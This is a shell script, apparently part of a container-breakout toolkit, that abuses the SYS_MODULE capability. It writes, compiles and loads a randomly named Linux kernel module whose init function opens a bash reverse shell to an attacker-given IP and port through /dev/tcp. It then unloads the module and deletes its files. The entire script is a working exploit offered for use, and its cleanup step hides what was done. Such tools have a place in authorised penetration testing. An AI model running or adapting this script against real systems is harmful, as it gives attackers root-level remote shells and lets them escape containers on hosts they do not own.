#!/bin/sh

ip=$1
port=$2
installRequiredFiles=$3

install_with_pkg()
{
    arg1=$1
    arg2=$2

    
    echo "[+] Running update: $arg1 update."
    $arg1 update

    echo "[+] Installing make: $arg2 make."
    $arg2 make

    echo "[+] Installing insmod: $arg2 kmod."
    $arg2 kmod
    
    echo "[+] Installing GCC: $arg2 gcc."
    $arg2 gcc

    echo "[+] Installing linux-headers: $arg1 install -y build-essential linux-headers-$(uname -r)."
    $arg2 build-essential linux-headers-$(uname -r)
}


exploitSysModule(){
  RED=$(tput bold)$(tput setaf 1)
  DEFAULT_COLOR=$(tput sgr0)


  echo "[i] Exploiting SYS_MODULE"


  if [ $installRequiredFiles = "true" ]; then
      if [ -x "$(command -v apt)" ]; then
  	  install_with_pkg "apt" "apt install -y"
  	elif [ -x "$(command -v yum)" ]; then
  	  install_with_pkg "yum" "yum install -y"
  	elif [ -x "$(command -v apk)" ]; then
  	  install_with_pkg "apk" "apk add"
  	else
  	  echo "[!] Can't install files."
  	  exit 1
      fi
  else
    if ! [ -x "$(command -v make)" ]; then
      echo "[!] make is required to run this exploit."
      exit 1
    fi
  
    if ! [ -x "$(command -v insmod)" ]; then
      echo "[!] insmod is required to run this exploit."
      exit 1
    fi
  fi

  if ! [ -d "/lib/modules/$(uname -r)" ]; then
    echo "${RED}[i] ${DEFAULT_COLOR} The directory /lib/modules/$(uname -r) is required to run this exploit."
    exit 1
  fi

  if ! [ -d "$(readlink -f  /lib/modules/$(uname -r)/build)" ]; then
    echo "${RED}[i] ${DEFAULT_COLOR}$(readlink -f  /lib/modules/$(uname -r)/build) are required to run this exploit."
    exit 1
  fi

  if ! [ -d "$(dirname $(readlink -f $(readlink -f  /lib/modules/$(uname -r)/build)/Makefile))" ]; then
    echo "${RED}[i] ${DEFAULT_COLOR}$(dirname $(readlink -f $(readlink -f  /lib/modules/$(uname -r)/build)/Makefile)) are required to run this exploit."
    exit 1
  fi


#  if [ -z "$ip" ]; then
#    echo "[!] Missing reverse shell IP"
#    exit 1
#  fi
#
#  if [ -z "$port" ]; then
#    echo "[!] Missing reverse shell port"
#    exit 1
#  fi

  module_name=$(tr -dc A-Za-z </dev/urandom | head -c 13)
  echo "kernel module name $module_name"
  sys_cwd=$(pwd)

  ([ -d "/dev/shm/rev" ] || mkdir /dev/shm/rev) && cd /dev/shm/rev || exit 1

  echo "[i] Writing scripts..."

  # POC modified from https://blog.pentesteracademy.com/abusing-sys-module-capability-to-perform-docker-container-breakout-cf5c29956edd
cat << EOF > "$module_name.c"
#include <linux/kmod.h>
#include <linux/module.h>
MODULE_LICENSE("GPL");
MODULE_AUTHOR("AttackDefense");
MODULE_DESCRIPTION("LKM reverse shell module");
MODULE_VERSION("1.0");
char* argv[] = {"/bin/bash","-c","bash -i >& /dev/tcp/$ip/$port 0>&1", NULL};
static char* envp[] = {"PATH=/usr/local/sbin:/usr/local/bin:/usr/sbin:/usr/bin:/sbin:/bin", NULL };
static int __init ${module_name}_init(void) {
return call_usermodehelper(argv[0], argv, envp, UMH_WAIT_EXEC);
}
static void __exit ${module_name}_exit(void) {
}
module_init(${module_name}_init);
module_exit(${module_name}_exit);
EOF

cat << EOF > Makefile
obj-m +=${module_name}.o
all:
	make -C /lib/modules/$(uname -r)/build M=$(pwd) modules
clean:
	make -C /lib/modules/$(uname -r)/build M=$(pwd) clean
EOF

  echo "[+] Done"

  echo "[i] Compiling kernel module..."

  if make 1>/dev/null ; then
    echo "[+] Done"
  else
    echo "[!] Failed to make. Do you have all the required libraries installed?"
    exit 1
  fi

  echo "[i] Mounting kernel module..."

  if insmod "$module_name.ko" 1>/dev/null ; then
    echo "[+] Done"
  else
    echo "[!] Failed to mount module"
    exit 1
  fi

  echo "[i] Cleaning up..."
  if  [ -x "$(command -v rmmod)" ]; then
    rmmod $module_name
  fi

  rm -r /dev/shm/rev

  cd "$sys_cwd" || exit

  echo "[+] Done"

  echo "[+] Check your reverse shell handler!"

}

exploitSysModule
